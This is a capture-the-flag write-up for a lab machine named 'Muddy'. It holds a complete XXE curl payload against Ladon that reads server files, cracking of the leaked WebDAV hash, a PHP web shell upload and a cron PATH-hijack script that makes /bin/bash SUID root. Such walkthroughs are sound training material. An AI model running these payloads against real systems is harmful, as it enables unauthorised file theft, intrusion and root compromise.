# Muddy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.208.161           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 16:04 +08
Warning: 192.168.208.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.208.161
Host is up (0.18s latency).
Not shown: 65245 closed tcp ports (conn-refused), 282 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
808/tcp  open  ccproxy-http
908/tcp  open  unknown
8888/tcp open  sun-answerbook
```

I did a detailed scan too:

```
$ nmap -p 80,443,808,908,8888 -sC -sV --min-rate 3000 192.168.208.161 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 16:29 +08
Nmap scan report for 192.168.208.161
Host is up (0.18s latency).

PORT     STATE  SERVICE      VERSION
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
443/tcp  closed https
808/tcp  closed ccproxy-http
908/tcp  closed unknown
8888/tcp open   http         WSGIServer 0.1 (Python 2.7.16)
|_http-title: Ladon Service Catalog
```

We can add `muddy.ugc` to our `/etc/hosts` file.&#x20;

### Web Enumeration --> LFI --> Dav Creds

Port 80 hosted a static looking site:

<figure><img src="../../../.gitbook/assets/image (1382).png" alt=""><figcaption></figcaption></figure>

I did a directory scan for this and found some wordpress content, and a `/webdav` directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://muddy.ugc/ -t 100         
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://muddy.ugc/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/21 16:31:35 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 311] [--> http://muddy.ugc/wp-content/]
/wp-includes          (Status: 301) [Size: 312] [--> http://muddy.ugc/wp-includes/]
/javascript           (Status: 301) [Size: 311] [--> http://muddy.ugc/javascript/]
/wp-admin             (Status: 301) [Size: 309] [--> http://muddy.ugc/wp-admin/]
/webdav               (Status: 401) [Size: 456]
```

Visiting `/webdav` required credentials:

<figure><img src="../../../.gitbook/assets/image (1381).png" alt=""><figcaption></figcaption></figure>

Weak credentials don't work, so let's come back to this later. Port 8888 hosted Ladon Service Catalog:

<figure><img src="../../../.gitbook/assets/image (1420).png" alt=""><figcaption></figcaption></figure>

There are exploits for this:

```
$ searchsploit ladon
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Ladon Framework for Python 0.9.40 - XML External Entity Ex | xml/webapps/43113.txt
----------------------------------------------------------- ---------------------------------
```

Within the proof of concept code, there's a hint towards this box!

```
------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE uid [
    <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
------------------------------------------------------------------------

The following command exploits this vulnerability by including the &passwd;
entity as the username in the request:

------------------------------------------------------------------------
curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:helloService\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://muddy.ugc:8888/muddy/soap11' | xmllint --format -
------------------------------------------------------------------------
```

I verified that the exploit works:

<figure><img src="../../../.gitbook/assets/image (3163).png" alt=""><figcaption></figcaption></figure>

Since we have LFI, we can locate the `passwd.dav` file to find the password required for `/webdav`. I found that it was within the `/var/www/html/webdav` file:

```
$ curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///var/www/html/webdav/passwd.dav">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:helloService\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://muddy.ugc:8888/muddy/soap11' | xmllint --format -
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:muddy" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <ns:checkoutResponse>
      <result>Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0</result>
    </ns:checkoutResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

This hash can be cracked to give the password:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sleepless        (?)     
1g 0:00:00:00 DONE (2023-07-21 16:38) 3.125g/s 219000p/s 219000c/s 219000C/s softball30..ramarama
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Afterwards, we can login to the `/webdav` instance:

<figure><img src="../../../.gitbook/assets/image (2314).png" alt=""><figcaption></figcaption></figure>

### Webdav Upload Shell

I tested whether we could upload files using `davtest`:

```
$ davtest -url http://muddy.ugc/webdav -auth administrant:sleepless
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://muddy.ugc/webdav
********************************************************
NOTE    Random string for this session: 4qtgGAJnSK33jj
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://muddy.ugc/webdav/DavTestDir_4qtgGAJnSK33jj
********************************************************
 Sending test files
PUT     html    SUCCEED:        http://muddy.ugc/webdav/DavTestDir_4qtgGAJnSK33jj/davtest_4qtgGAJnSK33jj.html
PUT     php     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_4qtgGAJnSK33jj/davtest_4qtgGAJnSK33jj.php
```

It works, so let's put a PHP web shell since we have Wordpress content on the page as well, indicating that PHP is being used.&#x20;

```
$ cadaver http://muddy.ugc/webdav
Authentication required for Restricted Content on server `muddy.ugc':
Username: administrant
Password: 
dav:/webdav/> put cmd.php
Uploading cmd.php to `/webdav/cmd.php':
Progress: [=============================>] 100.0% of 34 bytes succeeded.
```

<figure><img src="../../../.gitbook/assets/image (2304).png" alt=""><figcaption></figcaption></figure>

We can then get a reverse shell easily:

<figure><img src="../../../.gitbook/assets/image (1871).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob --> PATH Hijack

I ran a `linpeas.sh` to enumerate possible escalation vectors, and it picked up on this:

<figure><img src="../../../.gitbook/assets/image (2340).png" alt=""><figcaption></figcaption></figure>

The SYSTEM PATH variable has a writeable directory as its first directory, and the cronjob executed by `root` does not specify the full PATH for `netstat` and `service`. As such, we can just create a `netstat` script like so:

```bash
cd /dev/shm
echo '#!/bin/bash' > netstat
echo 'chmod u+s /bin/bash' >> netstat
chmod 777 netstat
```

After waiting for a bit, we can become `root`:

<figure><img src="../../../.gitbook/assets/image (1873).png" alt=""><figcaption></figcaption></figure>

Rooted!
